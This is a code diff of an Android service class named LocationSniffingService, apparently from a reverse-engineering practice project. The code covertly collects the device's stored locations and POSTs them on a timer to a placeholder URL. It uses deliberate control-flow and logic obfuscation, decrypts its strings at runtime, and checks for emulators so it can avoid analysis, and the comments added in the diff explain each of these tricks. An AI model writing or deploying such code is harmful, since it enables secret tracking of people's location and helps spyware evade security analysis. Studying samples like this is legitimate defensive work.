@@ -1,8 +1,6 @@
 package com.woop.tryreverseengineerthis.service;
-
 import android.annotation.TargetApi;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.location.Location;
 import android.location.LocationManager;
@@ -12,17 +10,9 @@ import android.os.Build;
 import android.os.Debug;
 import android.os.Handler;
 import android.os.IBinder;
-import android.support.annotation.Nullable;
-import android.telephony.TelephonyManager;
 import android.util.Log;
-
 import com.woop.tryreverseengineerthis.helper.StringHelper;
 import com.woop.tryreverseengineerthis.storage.LocationStorage;
-
-import org.json.JSONException;
-import org.json.JSONObject;
-import org.apache.http.*;
-
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.HttpURLConnection;
@@ -31,46 +21,51 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.security.InvalidKeyException;
 import java.util.List;
-
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
 
-import static android.location.LocationManager.*;
-
 /**
+ * Every x seconds, send all the location collected with a POST call to a URL
+ *
  * Created by Jay on 3/29/2016.
  */
 public class LocationSniffingService extends Service{
 
-    private final static String fingerprintStart = "generic";
     private final static String TAG = "LocationSniffingService";
-    @Nullable
+
+    private static Handler mHandler;
+
     @Override
     public IBinder onBind(Intent intent) {
+
+        if(mHandler != null){
+            mHandler = new Handler();
+            int delay = 300000;
+
+            //Path Obfuscation
+            mHandler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if(thisDoesnotDoAnything())
+                        return;
+                    else
+                        thisAlsoDoesnotDoAnything();
+                }
+            }, delay);
+        }
         return null;
     }
 
+    //Starts the handler which will post every delay seconds
     @Override
     public void onCreate(){
-
-        Handler handler = new Handler();
-        int delay = 300000;
-
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if(thisDoesnotDoAnything())
-                    return;
-                else
-                    thisAlsoDoesnotDoAnything();
-            }
-        }, delay);
     }
 
     private void thisAlsoDoesnotDoAnything(){
 
     }
 
+    //Concats all the locations to send
     private boolean sendQuietly() {
 
         List<Location> locations = LocationStorage.getAllLocation();
@@ -87,13 +82,14 @@ public class LocationSniffingService extends Service{
             builder.append("||");
         }
 
-        sendForReals(builder.toString());
+        actualSend(builder.toString());
 
+        //Logic Obfuscation
         return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
     }
 
     @TargetApi(Build.VERSION_CODES.KITKAT)
-    private void sendForReals(String s) {
+    private void actualSend(String s) {
         try {
             URL url = new URL("toBeChanged");
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
@@ -114,10 +110,14 @@ public class LocationSniffingService extends Service{
         } catch (IOException e) {
             e.printStackTrace();
             return;
+        } catch (Exception e){
+            e.printStackTrace();
+            return;
         }
         Log.d(TAG, "Sent");
     }
 
+    //Dummy method - b does not mean anything
     private boolean thisDoesnotDoAnything(){
 
         boolean b = false;
@@ -125,9 +125,10 @@ public class LocationSniffingService extends Service{
         if (isValid())
             b = sendQuietly();
 
-        return (b^=b) ? (b == b)^(b == (b^=b^=b^=b)) : (b^b^b^b);
+        return (b^=b) ? (b == b)^(b) : (b^b^b^b);
     }
 
+    //Check if the environment is an emulated environment - just in case it is being analysed
     private boolean isValid(){
 
         String h1 = "ï<ŠPSÒí¸U1Éà>";
@@ -152,40 +153,6 @@ public class LocationSniffingService extends Service{
         String k10 = "..a..l0ng..night";
         String h11 = "ˆþŒÀyD!»Vj_$™A";
         String k11 = "...timetosleep..";
-
-        String fingerprint = "";
-        String model = "";
-        String manufacturer = "";
-        String product = "";
-        String hardware = "";
-        String telephonyservice = "";
-        String connectivityservice = "";
-        String locationservice = "";
-        String gpsprovider = "";
-        String networkprovider = "";
-        String telephoneoperator = "";
-        try {
-            fingerprint = StringHelper.getStringDynamic(h1, k1);
-            model = StringHelper.getStringDynamic(h2, k2);
-            manufacturer = StringHelper.getStringDynamic(h3, k3);
-            product = StringHelper.getStringDynamic(h4, k4);
-            hardware = StringHelper.getStringDynamic(h5, k5);
-            telephonyservice = StringHelper.getStringDynamic(h6, k6);
-            connectivityservice = StringHelper.getStringDynamic(h7, k7);
-            locationservice = StringHelper.getStringDynamic(h8, k8);
-            gpsprovider = StringHelper.getStringDynamic(h9, k9);
-            networkprovider = StringHelper.getStringDynamic(h10, k10);
-            telephoneoperator = StringHelper.getStringDynamic(h11, k11);
-        } catch (InvalidKeyException e) {
-            e.printStackTrace();
-            return false;
-        } catch (BadPaddingException e) {
-            e.printStackTrace();
-            return false;
-        } catch (IllegalBlockSizeException e) {
-            e.printStackTrace();
-            return false;
-        }
 
         String a1 = "OnceUponATime";
         String a2 = "LivedABunnyCalled";
@@ -223,6 +190,18 @@ public class LocationSniffingService extends Service{
         String goldfish = "";
         String android = "";
 
+        String fingerprint = "";
+        String model = "";
+        String manufacturer = "";
+        String product = "";
+        String hardware = "";
+        String telephonyservice = "";
+        String connectivityservice = "";
+        String locationservice = "";
+        String gpsprovider = "";
+        String networkprovider = "";
+        String telephoneoperator = "";
+
         try{
             generic = StringHelper.getStringStatic(a1, ak1);
             unknown = StringHelper.getStringStatic(a2, ak2);
@@ -235,12 +214,27 @@ public class LocationSniffingService extends Service{
             vbox = StringHelper.getStringStatic(a9, ak9);
             goldfish = StringHelper.getStringStatic(a10, ak10);
             android = StringHelper.getStringStatic(a11, ak11);
+
+            fingerprint = StringHelper.getStringDynamic(h1, k1);
+            model = StringHelper.getStringDynamic(h2, k2);
+            manufacturer = StringHelper.getStringDynamic(h3, k3);
+            product = StringHelper.getStringDynamic(h4, k4);
+            hardware = StringHelper.getStringDynamic(h5, k5);
+            telephonyservice = StringHelper.getStringDynamic(h6, k6);
+            connectivityservice = StringHelper.getStringDynamic(h7, k7);
+            locationservice = StringHelper.getStringDynamic(h8, k8);
+            gpsprovider = StringHelper.getStringDynamic(h9, k9);
+            networkprovider = StringHelper.getStringDynamic(h10, k10);
+            telephoneoperator = StringHelper.getStringDynamic(h11, k11);
         } catch (IllegalBlockSizeException e) {
             e.printStackTrace();
+            return false;
         } catch (BadPaddingException e) {
             e.printStackTrace();
+            return false;
         } catch (InvalidKeyException e) {
             e.printStackTrace();
+            return false;
         }
 
         //Check build's fingerprint
